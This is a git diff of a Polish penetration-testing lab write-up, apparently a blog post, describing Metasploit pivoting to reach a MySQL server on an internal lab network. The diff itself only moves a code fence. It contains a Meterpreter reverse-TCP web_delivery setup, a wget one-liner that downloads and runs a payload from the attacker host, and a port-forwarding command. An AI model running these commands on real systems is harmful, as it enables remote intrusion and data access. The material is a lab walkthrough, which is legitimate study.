@@ -351,6 +351,7 @@ Już trochę lepiej, ale łamanie haseł przez pivoting to jest masakra. Nie wie
 Wracamy do Metasploita. Na ip **172.31.20.10**, porcie **3306** jest **MYSQL**. Też możemy na niego wejść przez *msfconsole* (ile się namęczyłem, zanim mi się udało bez błędu wejść, a okazało się, że to ładunek Metasploita coś miesza, o tym w czerwonej ramce). Login i hasło na **MYSQL**-a było w archiwum **http://172.16.1.167:8115/timeclock/backup/all.zip** w pliku **db.php**. Tę operację najlepiej zrobić na świeżo odpalonym **Metasploicie**. Parę razy mi się nie udało, bo w tle musiały być jakieś pozostałości i był błąd podczas łączenia się do bazy. Port **3306** zamieniłem na **3307**, bo ktoś może używać. Jeżeli zaś **3307** jest otwarty, to należy go zamienić na inny. Więc wychodzimy z **Metasploita** i ponownie wchodzimy. Poniżej jest cała procedura:
 {: .text-justify}
 <div class="notice--primary" markdown="1">
+```console
 msf6 exploit(multi/script/web_delivery) > exit
 use multi/script/web_delivery
 set payload linux/x86/meterpreter/reverse_tcp
@@ -359,7 +360,6 @@ run -j
 wget -qO jp4AKytE --no-check-certificate http://172.16.1.10:8080/IkIOzVOlj; chmod +x jp4AKytE; ./jp4AKytE& disown
 sessions 1
 portfwd add -l 3307 -p 3306 -r 172.31.20.10
-```console 
 [*] Server stopped.
 root@kali:/home/szikers# msfconsole
 [*] Using configured payload linux/x86/meterpreter/reverse_tcp
